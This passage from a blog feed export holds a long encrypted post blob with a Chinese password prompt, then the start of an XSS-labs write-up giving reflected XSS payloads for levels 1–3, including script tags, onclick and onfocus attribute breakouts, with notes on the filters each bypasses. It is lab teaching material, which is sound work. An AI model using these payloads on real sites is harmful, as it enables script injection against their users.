9740ceb5c9cd96161bbb4caf09b6c1cf3131d2f7efec446285becd4403cb13a0dde68e4985b3f374bb924ade737355d97fc3e671cad9d012f43d756136951815ef47a40413bc50bcc8e5e6c2ed4c643b1e4afdd95159a17141258b83ac4d7f67692138e8b672e0edc7a947e13e4d26457edc6a2a834af05c2c51219df1afce0f8bf26371dabfa88305b47b40c3fe28a74e964f480c115e3bf83c7642c245719d175a70e771829d60103096f6f06d929c6a36468cbdc5fa3a7d7000cab223450bb3e74c1affea458eb4c4ad3e5ee2dfd8af8caec13e90bdf0f6fc9113e69a9417e824c6c944dfe847be964367e0285f41eb6684663b49ae394b626e22588d0be4197b4f9d8c1d65de5949e19609bbb3f93ccb4f9b4de9f7fee075e9a7b771d0ae8ca5b4a83b85cc80d9ee70396744ebc3a6f903a7af04488556a88ce74984a4ad0965d1552a39c6d90ab1c7a76d33dfd5759d0f7281ff4d1ccaad20f6c3b2c49c08f67f16a952f3d89ede3330612bb9775ecb30aa0987a46bab65632dfd60a306b08260ca1002fd429f3c191e143d4ac028dac4ec8007c726294ecbcac986529d552e06dad86210ba4f781a525bdaf4814f8215cbd18dbd1fef08c972fc46cd2863d657aaadeaaac5539a45cbaa434bc9fceacd4b988ae2d26c2b3ed377844eed26b515d7095f28137219877342bc146f09ba32c422987f89980fec568a40a90327e4b86019f2e6ca9f4575ed2c0acd91b5575f67b82901d2086cda1d752ffef630da62624fcda9591352d1df4ef54d9f5f643f4372abdc4c940aa7fc89204923942fea7d8ccf7f227190df4575fb57c9691cf9c904ee763a0d6cceab67ceb7bee2e3cb9776084f1e483386eb363584d318f22174237740a45bffd2592c4959f7cb82545b9379e2ef7e343bee66b30b3d1679eb117e3100da990a251cb1a941d6c74562d094f4aa38f2e7206b5c57a35528532e902c409cfe6c22af1701427b353346b27b9b9389aaa081e981a91c299113a201451c34639df7963349070ada62c0f76bea805366a1d58d4853e59c5aa8df7264d9cf3d5317521d9e6b5cf9d2184a6c2850628075c6964f3b03484615fed589f9c28fc2a9ce9f0f66b9fa0484e38a799faac2936257950aeb73c02db4dec3f9223fe68335d20e297fd3f37cdd8259da11fcbdc5464556d57b9e1ded568bef6057bad6dfdb04b369f3f2c173f97859b5675b0340da9a7325aa190e7cdbdf9bd31407145ce99297ef65f33d395f750c38f3fdfa2bc08a30257bc51b31b3acb25d625cf9ea737f3fc53ad182947b5bbb0a85e83c95005556e2f251fbe7fb3e2b3112d1ca0bb62b27d804469118777c57b44f698ae17a9a98df53a34746e67ebe19b60d17b73ba4cf87365cdc551cd581af0c2faf3edf6e31f742e685fd49999fe8298ffdcf5199a4ebb5f1bcf4bdf8a7325a6705c620390f273dbf8fefc4b6fc92caabcdda0fb16577631ec9e257ae4540c90a6512d8c3a2abf4000db030c8dc88318c56716d9b8fb3917248feb6a33bd170613fab76168611b883796df35cc0c0293a712c44eb1c002a0c76978bf84d750568315f1af508c248537cee58afdc1a8178fe9c9434ce17ec6558609218c91318dbcca9cb237dcc362e0212f5604b20bdd936ab3688bcd9a7456d9c66c9f678f467ccacb2873fc32577e88af7051104c56e0ed022c5280a7333f52e0283adffd78069039c383a7adabd4e24fb8d0be36c22b4f4d3eca61bee81f61cee4d3feaa63f0143b93ee9970a21d6eb6dea85927c4fedd0ddf084aca1134456194504bd7926a0fe8fe56237073de1823937ca50785b2a430d34010653d43c5a12308fc001b459b44544138c4bab32101289ecd74fb5575f55568b3a2708d4ea011b2f824b898a71544154628c3f2f73fb5637df050e64bb3b5d58f999041dfb52261c44259bea922612c2d4657e53f26722a0e3ab8b585944ed7cb73b759ab30304b4f3bdd2d6f61a27b2d3016394f2926ead849a65e3ea12f7428c8def21fe93ba9df9d350996539151331cb5a12c67c695884d12297a8544c5993f20ff16f8ce05c67f74251f674da33b351efa4788b6670f20fc893db32c6978f64b36beea72025e1d59f659c1e5b29472b855242b793596b184265de2df6ab02399fac7c649bd62a31cc1da35390ed1ea68496c2f11714ae83fc510db0fe00c8ab4d22ae3d29d4f412fedc6e2eff5cca3e7d504a1ac0621023677b29c818ce4f6bd1be4229b4e54003eb048ab1efc2293629d8af9354e18c936979a65acb401a1846ac685dc24edd5295fdd1739ec64ead830aa302b2f7079d50146310da4ba34334e183747807e438b4fbd4aa2d8a6341b4d205d5b9b49a917360a990657836e6276ab76a4b45f1a763d2723dc539e812c80bc2919af84cbb355bfc5c317bca48b219de76437a4d025889f07dbeac91c054fad8fffc79c932fa8d5ef1287238e3e41c2d34c164668fab9b64e83e93a10ba759989e78e1e400d9ab2b5504568e5c26f5fe0965896e94a38943ca44daca97a87a986d4894cc71b56772c05fd3ae6a0416ed825bd29fcb876ee5b3d0a5272dc83d40429e7378b71e090b8291612058126c16fa32f86140096d468c1d33215d3cfbf8fb22f4377e5337e8b536a5206ea59d5637c04722080a975c3359bf1c1aacc58e211d29462914d9bad09c4080116523c24922286fe4301da852e4564dde1bed9cfc4342b1c5a03d9054365f4927cabfdb1a58334702a86b931ea47b9eb7eee956ebc13831165d983c38908b354149826400d334a0c76eece8341416f7084f9683021b8ea0fe76be3fc6d7b75ffb1203edb3b56e76b1d168bca5789143f174910a7ac9bc9e588f6e8757ef97580c03c15ed5126de8f828f60c0b6c3ec5ba601e3448c669f4b920570440e1767c2120e1480eb858927a9f67f725170b20a53811312a6147401273320d01079e8f53b1f5bda92641685e2b2df3f3c5d4ce6c498da9d0aba9b525eb6986b08a3290b3a201058117cca50c7dee96f51b61204fd476610fd1524e3b7096110aa805483feb3fde61e18b9a6cd8bf651a79d20ca55efd62f13cc32fbf12eef865c47166fa203be898f4bebc13518f9b02c9d80d3aaed2933a14ffd93ba82ab882825ec925b3183abe665495a5718f898ca3892aed34c87dd9dd2ea5807c2f160172d48a894a929a314a800d1349f274f7d9908557e8ab1673c4e065eff24314a1777cb52286d372392334e1b8067f18dfacd8c989ff50207662651e817f419b02656bc6809bc66a0beea1a3a1f01ec55491e366f1ed5a8477d5311899a0da8b9925319534d59432395d426c87e86a40e7e4e8d4ec98385d4d49d737835b1e593db7c28a3d336c14b1bae1d692b2b8eb31e10752f8491d1f8200a4faf27a44801221a7985e632412be4061f6082834ac06bdc3a6c3341dd85612eb8cf7f3fef3207af529a7fabed25b3b888784305dc0b2dabc44a84872092c43732da25a4eef45c62582c1b3ec8c4d26bbcf51938802cfb2847068d0d157eb99132edaed395f68f2f2e6c4bea2bed080150ae062ac3cc595a05a622d8a6063bc25eb21568ba3d9fcde6ce97d8cb04506fd1f4dd8bacd192b551d9daed5bbc9572f229ae20b3c97dfb3abc85b8c3d2cafb0973da2d58e46406c702ecf4a015769cc73e59e94e972880813de859708d0cb29644980f7879b811eeacfe05a43aea456f9bf814a1268f899170771d413d29490ded6338606f6545a1bcc0aa9fc8639b1926c58a01be26f2404a86e81b93fcd5a6c23a9069403b91a75240aee9fbeaf0d84ffa141e9d191ef6848b40b788251cf5b2b1c21278c7ab50c77f9d3471d0a02e02d782371baabd427bc4e47e8fcf7302fbf2a3256c5ff8590e460ec69cb81a25442c632885fba5ee9286a8342d1a0d02f07b40f2843c00745dcd3a43c1f6da644af52fdc97e16afab957bd993946fff2a37879e6ed7073f625ca06ec16ef8b9f7520297a09829607ba0c1fc12c1cf793bceb82d035f5f6348f21c6d42187e4c95c707223f6af8b2ab5c7c86fc7bc94f11e4691d01681d4527e799c392ad7d491925e12230f4f5e8ad26ba56df7f2a62d55265583c639ef530513c0698f3ffb9d8656bda2ff98ec536c9461d76ced44078e31e285efa12a58cdabcd76dec40ddc876c0333b9c6bc69741a47292f6ba126beda1f98df3dd3c9e528dea492887b23f7adae4e8175f276e37e80a3e9e3f556e2b40d8ef1921b13dda475a971acd4679ecc886b477d4f1e8b2f9e615e174c0099355d2f3b071599f0c0637185abc3a5c5ead021610719653308f2dd158b332ac2065451053d87a4a3a504cd90380e37834b17e7433807bb470639e8813c7fbc44f44aba77b268d903a2c4fce73cf182f5b2c3d7bb7a148bb147f590b6b89c33ae3caf3a04ecdfcb13030731f7a004ae506e0bfbcabe52082d93d5dd141beaad7007eb89c63b67319123f0f2ea0f261ff115f4d34ae8d1b3e009a8b38115d5f4e2373691ea39043cb68ef0a7cdb374289e4d01bc94ae8bdd55fad55d36acd7d16762451f51e3226a9cfdbdd4d9f5749a7b338fa23e5437b9819fe65ecf3412c04e60e483da042888c92ba00b33ce802052a15cef0ddce6c3237557cd2433c80dcf09232475438703c9e11af733645c90c6b59593d17f153fadc975ea6b43beea70a140502aead0abed95798efd67ac241887af82c990f4f471de431a2a692c39bd6462228e61fd11ce952e94a25ea7387f7f8d77fc369eae0e34484d7aaf1eebbce812054e8b410684c26d0b1eaf90a272aa77e40ee0c7ddcaa25fa2d6bdc2776f44225e027ac70f7946296ecdf15c4aa4a83c89a84889c190104298896da982be817648385264cf502f1ac8eacb68dab9be9173d8947594cce7b65f6671db63fece2c3c77ca42af0859e8f8411d0b037c1d9349c7af6c1a7f9a7da39d4433fac1d585bc83a64efdff4eb75369104a581cbd31ffd8881eb447f7b71d318fb0b80c41471e81d0bdbec2f80ae141c8e64fd42b683a8ff28242fab974ebc945951cd0a4ed34c9060ae13f356425109a08e28317fbf2e70172d1cdb9654c199e9dc2ee0580385bee941869bc861ac6205a7fc20d502b2a95b9097d70b2026a59228508cdfab0d8ce08370e7de8c32ada2384aea2cc18457c89560932571641ce1ca543d360b7a8b150bde5fcc85d750ffa6b562669d7bbdd97313b1d91d939c6c21025b9885842f7c1970fb74150b34f247779f6a032659994d91b0d0e012463e23f7a02c4e6ca0ba0cf5986805b43b739e641d257fa2b1f3a530ccbf74abcca27bd8f15458607adcbd4ff1510578746171a4f521404e68b2c7d8bdf2e4cca857386fda0d0947ed97027673c177a9cf05446c57a11e463e52f9b84687ae8b1ad08c2cddf166900aac782315b9be554cf21b5643e3123e2d9429b5a0fbf3d2ae7eeef92b72a0584e012986139b840ec774b6db8261ad91881f2d5502422f9e0cf77c15f34d5c772a9cabf8094ec9cefd146760a709ed0ec7ad15f8eaf23ed93e5f1cbe70705f460a07adf28ef3c8acd4afe68303fe30c83e876de68e989dc427cf448b84550903b676d7cd2298492758fd3f11fb211b0f85108c4d45ff94502db51741aded89a4025b4f39ece2b39a5530c5cee39c5595ba19446fe8682f43f14b26f5e9614362282df06dac404449e713fbcb64c1e80775d91aa86d37c20b5ed2a39c87fc899582e1f43976252fb25994563d4ddb6de97f8ad273dde0695817fea23dacc9a6eefc98fbc6aef4b0da4fca6e9fd2536fe88fd3a160f7e0ca0ddd53dfe2a15a55d4edcbe44c75ff347ee8669a7e48bef1db0556caec92e58a9a30591a7bdb2339dc86d745c1e52761c88b086f78b40206f58bdeb063e222401c75309970393f066fbe23b264ed8650e97d033ae646fdfafca8b5691ca0c68399740a73e317f41d87c93d7545e193e1f40483ea575635234b672ed9aede3c38f7e0cca91e3acd9377cc77989e0ca6637b3b0cf69bc41dd0f6caa818ce219de55555ee1617ded2edefebc11bdb2130f47e94e382a2bf3efad758f5de491d90cd42adaa88db3e8017dff9f2d8cf95b7e72a6623c525ce012900c84819fc30036d8fee99337e0a047d658887fb7ce1ccbbaa1d6c17ad73ff91405a14046652eec297ddd413157251f7a67eea63a01616a7c09fbaa44c52b8d188156b17f8e43a98ad9d7558f77a793ecb3c3c3efe0c9d80f219d18de1f7b999b3d930076ac5e8b04b6303dba868f625a01c2a6cb82f0a09295478c2835e842ff4357e5958c740aa6fff1b056310c4054d064f70f924492cb5324bc4b28ca9b47a040f93a192adebafe77980e9f0568259a0d315333992c58a8a18ad3a1192d5dc2df155305e601ae39305635e3d585bbcc1318f0313bddcdcfb376345089f774725d781f8afb7b2ec3a6d4de3d3200496458d7d20c7d57b92fc78c44c25d4c1df30a6806a88a0ffd41aa5ab6d20b0ded5418411001ba942c0dfea509ab6cc59f92df4466d6c0fa1ad2d8a9f8df0dd63d237da92ebb0d331181f3e9a303add65ce2d18aa1738d745fc6109754209aabde38116c2a5635f1e3c66980ad31707ee8c74417941df6adc5d414ed9c8f3a0dbe2f80d58e2448ea3714c0db690c89c2a4c2d802daf0a38256c05f7fa2dd759310ab57232512710a1ee0f8c32660adc649dca59bf4df345385e6d806ac6aeec0f5e9aa38e65866792def4541855674d422274b830e8684b590cdabc706f6c6efb12f5f0edf621ba878b764c734b6cd111e88248e0cb6ce6703346c7981d5089efa3884d272ca3a1d1374623765b67dd29421d03b74140a9dfbc9bc83e21de3bb17ad3f857fe21f971940e0e5ccda0a1cc85b117588fca0ac04a532c9ac03a1ca26ea7d758ef7a2cd4a684fefb133ceebfb6e819f7da5d2c3c7f48ea917e5c4b9944051a5ec181ce35495e113989d08eaff2679e85f5337a42d0adb4e51b581d747cc00d6f28a7f8919253114611615eb091a391d3ffa5c2b46b1e69dc02c67a0793b3f4d81e535a5d0a8b67a397b84a500cc40dd1826c9ce9481631eb9c05e1ca54296088366255f36a1bb19d765747d5113cdce8448385af7266e629e371fca46a3d038b64755b3940b4873029d31967908faf97608a1c46490c888567e60c8520307b30bd30d42ef740899303b768bd3faa08fa48a9ee676523f0a81bd4d4f436eda272b371c6df7489d87a94da965d50e5a4c38f3e59c861b0367cd3f6a75707f9b34ad4e2714d65a84dbdc13c8a3259042cc0521730d0087afaffb1b52bb3c49c99cbf02ebd253b7fc30d78194134a612c0a0faa12ee99d12809a37e6afea35b6bae24ecd60cf4e38689bfdd156bc0ffb611a85a908981235810a854cae1f9736720dbecf45672ce8dcec0a22d95e8d5839ab7b9c2af0890da60337f12f8f85cb9022ed1a5a15297df9f2c5c90aec921b04161276eae4b1a176c960dc396cc7f6e29ba2886245b2c5059289f94d9079e49e9ff7469d0134a713fdc7022e4e3f60de634ec4fa8f6e97ceb57d2bf342ffb7fc5d318edb7e0e84b162e6662fb1b41043256ed1961e791712c6bb9c06cafca50ea15f8d59f202e544f1f2d63f83679f90d4cfe33ef3235b489a2555d6b45187c00da53bae9376ea260ade64bf143242e2df72ca1eba9d49465ad9c436a8050747f115f3314f03bdd5f3d9b3a24c0eefd9ffdd9d2496518706e32115521488dc14af87f1e09ed229a8024251a5f35ab80a19d921d02c709e392b12cb6a7235f38184c1e9679f88d071f4b006346b9cdbf2d335b6c03fcdc9035f338c9e8dd3453e3a273a0316e8181eb9744ee641e2e493693a3ef9a55dd1c700e9ffad73e72ee2f0d6c58d34c27216489e799c51605f2184afbc6a9c2ce1e7063fa8a3a04367e1ad37fbda971c41fa3481aec665bc73022997a44bb6a3e600d2ae393420b91f51a7f0ae5297eb4c52bf7c5ff3332833a64665bda757369785004b634001e2c36b47aff8331c270c0989912c99f71424e233a41a6aef8b1b3077c34a577906b9fbecca140ed21a1cd6c19270f679373ada91cb69ad2f7c435a1525d01e5e0bbe68c3df46fbf5a474df3c3a204b7c489058edaeae54768c7a85ab40f849edef80f840781feaf92b449c7e943d08be7b29af070d2021d7a740777a2a80ebb80fc10736aecc5c38d6f356e546b8419178ff60916dfb413e59e0c0b2add693bd43b6c71fae92b9169c1249526c6d0888aadcce4f8866104112bc06432470a5df89af8fe6eff5e5997fe9485981ca73f68c4aac36b0c18b11098f5c18d35cbf98cf2d7434d850574f289be23335beb524715d73a07faa03564e4183b5afffb95cae1ad735a7f639c451c6e932b37bcaabc2a654ba424769d2d62cd64ebb284d8b944961f1200d454f16f1ad260fb6521ebdad5b31d14466d8f986829a1f42815acdff8a955392e04870d92219a79141cd74d7dcfb58deb33113ac3959ba50f5224ba9dbe97a0cf9177c4006b7e12c321868d8b5bf8dd43a5e2e0f2914c2fb585e6ffdf031b492d6429ae7b58ad141ad268c8ddf0f568777db0c511ce866d409ef0309fa56ef5f4848d914a0083ef0c76cd69fb419498935ee1d62ba03bbf5c7ac23349c496856eb4a87e09f9e8f32090668f6fe499c659fb547b0d0ec8dbb7a5dee9ac8bcad3ee92494679c610dae3dd2ce239f0df33a851f114d0663bc21c0fe5ded246756689e7d76740e3fa4432d38d4ea2988226396e4da8f9da840c618e0e462b6f87910c760a875c901488efdff57e72fa8cac9af02f61639af669233a1d9e348cf4de44277d5609ffc4dddae00c7f76f9fe0a1ee050066b108e2bc08dc16b4823eeba7314116be219aa21769eaa782d73bc9619e9ee4a7aba9288db13977b571841b594b7da5d52e0743533189fd7b1e4ef72510895e119ed3f3e081f6877656aa25c316ec372c5c6ec5ebbe5511362162cc601c7b1086cb8f4c62c656df17c0037e2b07bf4feb7fec6b42769207cf16d7ebc9504f0d43bf335a0406e8dbf1a584a644c307d30ed5cc13e3ad6d6047608860d7dd537adfd4245ff12c0df0fb05fc00d1696d70ee50d5d06f13ceab53ee4c64a2e9c96de10fd564ea2277b0c32f2598b9320e406b02eafe890e865e80b56a0c42d3913247aad87c9eeb04b97bbb1f3dc97b8f581011393f11fc04a136eaa1ad635b9c2eddb098e4e0e9437a13c399322a9e01327d374cb2ad721ffbb2e8454097e13e0315d6656b03ea17b28734103fd8bca5559062bc29acdea1f98a6949f589daa4b37b7334e14824212629206d2a1eaed021937139d970e487b8dd40eaa82b9838cc013a1b71b20a777a1ac8372cd239b5c8abfaaaf67a3bdfd7cfab804a678427fe84a63c69d542b4a30f08c7b358565d16f55294aea6829b7bfee980f7aaffa36068d4b0f67e3977e1ae75faafcbb11b40e24697d05dbce5d00c1c865fef6172dd1835da21dc9f82d517b2bce5d797f95661465ff079339397277d7c51f5791dcf0394f3e8a0aa6bbde55cb4a21b68c613f389aa0a21d3dc5397a0be39c1659d620851cca40a3cc36e201df8021753891f9d94d2b33fd946d1ed680763a13cdd31b032d4db09f85ee278bc1a21eb8b87bf63f7fb9d8be981c9bab255a55527b41ce3c06fef49348e4d6b552b60e26cc5384497430d547c9324a9aa0054a1ca4c1305b2f22a7676c6ee072ad0653e823a9ba51b18bbdc2b84bcb24a0965838c659be246b6440bf54a4d0cddb40f51237b4720bca71dc00edc7213629158d32b56d578c75b4ba6155823b585cb54fbf2d6e28f3b0938bac4c182883f43897f68174140e437ce5ea7083f8c2db7e327278d6e672616726a84e9e0a203d1d8ff71e27a19257a5a319f71eedbff5b89af100cd3d8cf37e4a1bacf86c6b5b62f895d7ec76b0ba2415c2fb513983d67a351100e32ab7aeffc5700a235d10c2cf3e2eaf9bf01a32538a143839f01393e12668cf68a1d46ba7ed6d03c195d8bf16c91ab5954eeec6a4f9ec0bd47ac29a3833aef2a876ee31279f34ae5ca14d9431c1f327c19edfee71fed90fea1c9789dc0591f733ee29d083a13e3c23e75b34b1a58d7baa57aa9c1164b24240c65db44abf8778dd197fb7edc44ab0ad777358baabb6712b2d3fb53cb9035e54e6baba4a07fdee60ed6f1f1ba42860c02e08ffed4dea14af922b55f9fa3dce0cf3a0e22364491e29c042c63984ab80322874ad5a27deb61662597c15499340b6561e590260f73b0f131e80202ed087cd6c6ab0c55d11f7fd30328713fb2b08d29e535feb2fd437b118ce80c9080df054f428afe09cd17b8fafb8feaa6cb2b5997636812187eedf16058fa52c9112f4e6b50f64b6980e48249c63756aabe988ecd6da1f8c7a02d065f2d341ea851b2d496d12181cc891389a125129d748de3c8d7465ddb4e648f3cc67d9a89c50bade44e5bc5f58f365ad9efb6b04ca3d3a6d6d3ac41687477f6f45293abd483b990e68fe3b386377994f7fe8acb5d9a73073f5e73115a7b66c9a3166478df0df1b4613a834b535efaeadfa4f97c1bfc73e32e65358a7b24a7e7620174eaf9f921da206d3f46ee5e548d8732d6ed33d1ffe72ea554078be88cb9094e593e3a7fe8e64217148a978891a394b7f167dc2603487e48150e4439b166a82fafc8ab53023f57a767c1ab646ddaf24e1238afd999560535eb6d4146ff02e0370663ac0aa74afaa22384e4c34475a00f7bdba31d1aa76088c59af772d64f1650c056d74921e394400af77b81df44deb66f8249be5b8d4c48c425af0929a223ccd3c51776478c6c39adaffa9d791e06e7bf84a888a428947b938a70dcd7a7df519ad78be5a2b3ef165f4b865c759ebe4c0173392cfb87ffb86aab027471084ddc9cea3b23ffd4d15419a04fa10b61c7e19331e86da6b38bc8f841c434eec6761a835c86cee1f7d4d6617b6af8819f478a63978f637c7aafc2ef5667d28589f74ca9a70309abbb93fcde5d884fb974d9db940a5cf65dc7b301f48a11e0e9b0730970c7003474b9a33e5383edbd092b1ed2f671f8c51fcc1b27b957fd16b230085d0d961ed3d24534085be96d9dd76a907305c2e6d75839f3cda05bc397557b844d2e0c5a81235aeb8900c1bdf7f38922e36ff3cf226038467525e71fa41b9beb56c030f89161b32371210cd19da7ae465e07fb0bf2a60f25ce2c0435fa39138869f71712cfd3fa1b68efe0a9ce1f9d43547b32b985c497b0231132917fb0362b9b1ba468a5542c777bed85746c5122ee189c52b910485b1cc087d23f856f0e36f529a7cbd0c91f882db2131a27ce11083f8bad5c460dc491a2ddaa82f5b51ec4260167182c04e174cf172faa75f593b400e8703344b75efe24450b81af7da341ed6fba40f56f5c088aab406f2f90ff58e7246933eb05466d980c9a7cc59d44c83f3308df64019435c3fb9f199f7c609b0e506ff7a868db4d9d5e08c6a80364314c474ee69337cd0e34822f12fc9ca74c637f9263f4e45919d6b1c6aba040d53dd42c1545da77f328ef57e6e71d8b4e289e789ece1cf1fef336deaa6cdf8d584b8113666b4642c81c19317c74d8aaa0795f8d692e10c8a47189678e23209ab26ccf185a59aaf81fc59e92117b410e36df9d18f352ebf4e7006d57b3fedd66df5bb57737c974dad7de54c2d20becf888c1c738fbf2100ed428a6c252102a6a02febdac05524888567ec18202e9d2f9d0e64558ab12a605fbc4bcfced16a12709fdf5a3ed370a6a956bff8df8aa50194ab83f9977414cd4d7613c940e6559689e108f72e04f248c9aaff1676935b52c4d17cf0fb49cc7bb2d6ac76f778f3f792933f458fbd7fc4eaddf4d392b1799c21f8b81efa313c2561cd9a082104be1a7c472d3575c9f900135a5642930270a0c4311b9be389ea05ed8f4c7262afcb9416201d39a805af3f92e2729e4665af06309e7ae1dde953f7de37096f9323d3847d1b7bc5332376dbd4dc188d8689a5a16f06ebfc3ccb5b177ec19f02ef0d77fe179935e7d338f8a27216a1c25191da059c7a10b104265f82705ad8633cc7209213fea302425af95ab7e03e703952ce68e2b1f5d9b8abdc38430ef6711e86c68bdc5b2981106f54f146737c13e6807369a01d005dbf6d2ebaa88cf91b32b7ffa690aa2dd74f068c16cbe04c2ee6aa7d4b11a5b40873e8b2c4c2ceb874892ceac3a76386379bd3c17c05f1a237a266e29f19529fcf7d4e1914fe5fd395612857a5db7006196a892845c40c5ac3aa6aa331d918d34f0bef5776e88301c9c3f912c14dffc3d23c97233a9a450beb6fc04c6fe7c9883f6a145815948b5f8b70579644a92e86c93effe067b556bb993913498a3a1222d04630f2d18611f01ddaf871ca49d2f429c99d45ee0b368c23c8876def1ca1d740e7650c57543b914b61521c9f4ff5a5259b97059f4e3e11390be3735b55436c4f71226f1c9cf70ac8a37808efb4cc9899a999231a4db34462d6e50185543ea1d0af82dfdfdefd6231fdb9d73c0e32adc6b3875952032005a3601ee3715b23fbf524c9ab5cc7adc6b98ad97f8394503b3f8daa9d6fa9ab12fed61975279222148ca3d941558462aa8d38283008166e0d4634d8df847b64d4762dab2cb072f6d0aebfd5ccd67e6c7c3efaa663941716bf73b084f459b8b327869afc916850372b7d02a8e2e75d522110fabaaf11dd29822199c174adc7e1c0a6d21c3a28047426f294d13b9a49b3fe4da6178743ee5e98147f12fa72c8676e1dbd2dc6a0f7c5222f7ef8210a3eefead59f7a38aacc3979e8166f7425e9fa877c55feb701f79734de7e61827d4730ffbba929397d97bae653faba50ecf99bbff844f55c450494f8b18abc1b05d634709dc3780494d608e4e341eb91520d043ded280de4ad53739b01d5af6245779e989a522b8d4e4f2001398ad5a38c1523522730e22b19751ad27564971b1443abbbf10d9fd21de8c7676db1cc085bc368bed60715f73097726b6c408aa3e143a2204124401f9583e7ffd3f8b511768eed756adb49afabbc7fccb8996e9e0489840d184995d80223e9b387ec114ce39f630104818df81d92c1ec2208d35d3b90e44f7220fcc3d7ceea84a2577dbc868b5513f05d7b6b3840d3a3a922e04f231387e91322952396ee10dbfb4500cb8aa69b5795f9437fb62feae42a41efac5c6db026d395ceafefdf24cf81835640c461d2e0a0ba1140ef66b817c888ac1c9fa6db8bd1a027d0bae09c90b0b2c37d48f821a5a20b8a0ccd85150691f1715f5f4473cd3639c53b798b440ad7a03a3dec8f7bd035b1bbefb7159c4f650ac16f1862f9121b6814785f38a3a528487441bd88a5ae2edb6006200d6bb8d1389bad089270f93cdb24f7b851845c0ef749af0ff00188d0f7ed3097bdcdb08958d697f21fcc40df9eb98ba743c57aede902ad471cc2ef923684d159f9a77dcc5e01828e5384ce9c130c463487fa89c49d13a6b521e82d2d0feeb14091c7ce82cd0748830f2f9e9363767f6b21895459bbe73d9e95ce4b8204d6fac6e790803cb4118082b6412ebeaae85db271ce80f0aff81f427345bbb32b72f2a43365ea958d28940333a563c94aa6d0e6305525b1465c27ca96a5aa7d89f56cf4bad32c95df56f6e16e195e175eb18935a529e4b72e0cd05076bd56e85f8df02af66faf5322fae9bdcfec67fb2ff66077168856f8463b714ef75a8e7fca4ef9ef38456e92bec6c337b31337681b6b8b10d49882ebdc4674927c08e85b34b0414ffd14885bdc0c8e938a4a072ea55e100314b220c583b5add922f0800df24823a02fbad8a0437661c59d052159f6ad55eb16ae7eca3673b1b6f5b4a2c3bda465314606711adb0975a60bfe5a61a922a40fdda1757ab33fa035df61127b7ccc375b475f80bc104ae044ae91f81966173e87fe9686a9d0e20e084897278923990dfd433b33033ace34d36573f9bd2de651597dc40e66294505b4792c1cfda738a25d034d9337ca6312356c3eaad70306971e0adc49c4eff1e595352722feaefa95255507c1233d9f4bcf96174c0a93c03edddd0a960ba62b2e527a5385e4b191b1ebaed07b05488e99cf0d550d631cfa274dc9f9f5279c9c67d4ce3b95c09464cca385abc193b7e8722a1fdf66f16eaeca3016b1a806c4785976113432db74c3f6772f64c44e943cf1f30cab230ad90fd1692e5f909b584be4f6add24e0c2d3a424b7291bb5de83955bf237af2db04a1bd89787d04fe3c5a5f343667df555b0b9092ba684d9043cd93daaf35a40e785c8a875f2e50498e93e8b331e703a0f688a19a05473242f265a6ae062f8bfc9eb8b69770dd854c252dcd3df0463a470f674237a030d97bc6db52ff62052418e09053387a29e8368615883dfcc5355c2c86b4a6f07151014681fa2bba4ebeda1a97b02012b73d397ff2c2f41ca7a6e3d3dff4ea6628762e8b731dca3b29e9709e2e7fcc878c56b8225f77e855092e0be39a8c58998c0d34c88dd0fdaef1f83aaabca2856ee9552c43e6e6bceff0fce260b9f74f9682996832033c83a63c6b0bae4ffeda8943dbc1b20abcdc11afc70da4ca6b0a66cd4a56c1bd4579127a93271d67990a62f26b8d3fdc0130182103bc6adf979c98399472756c19a0681e74f81fb6d189d2e384118a1ea8acab0cfa607060a47ceb8b4acabe1d868c4ba545ce7ae6a364cbfe29fa257393e15ac22efbb99746a599edee1295702d74080e3b8fbbb8d34eefcce37dd5f85f84b26fd981844cfb337e7d7dadf14d69117da0997b1ef4af757f86801d2bd6262b5905b650fbd2ca7acdd25a2adf6ba9dc9727894b3c5ec1144b6b8e6426e2e9b335793f671bd1a44c4f0e3d573721a18b7a9158c908c621fae8ac1e9413d9db3d1d6c54c03e1ae1862a5739689e4638b832cd33af44fb41d71de46bb96f453917069104532c645fed1eec97d8195419728c1285cc9ca798afd80ae386e3d4af55b526b8fe61237848d30ae9de926c6830fbd7a019a5bc7db491cf685a33b920b8454f97ac36d519490561e90e26b2f</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>XSS_labs_writeup</title>
    <link href="/2024/09/05/XSS-writeup/"/>
    <url>/2024/09/05/XSS-writeup/</url>
    
    <content type="html"><![CDATA[<h1 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h1><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="hljs-built_in">?name</span>=<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p><img src="/2024/09/05/XSS-writeup/image-20240905222124904.png" alt="image-20240905222124904"></p><p>name参数未过滤直接传入html代码</p><h1 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h1><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-string">&quot; onclick=&quot;</span><span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-number">1</span>)</span><br><span class="hljs-string">&quot;&gt;  &lt;script&gt;alert()&lt;/script&gt;  &lt;&quot;</span>  <br></code></pre></td></tr></table></figure><p><img src="/2024/09/05/XSS-writeup/image-20240905222529637.png" alt="image-20240905222529637"></p><p>对keyword执行了html实体转码，因此思路是闭合双引号</p><h1 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h1><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-string">&#x27;onclick=&#x27;</span>alert(<span class="hljs-number">1</span>)<br><span class="hljs-string">&#x27; onfocus=javascript:alert() &#x27;</span>     #onfocus可以绕过html实体化（即&lt;&gt;号的过滤）<br></code></pre></td></tr></table></figure><p><img src="/2024/09/05/XSS-writeup/image-20240905223056342.png" 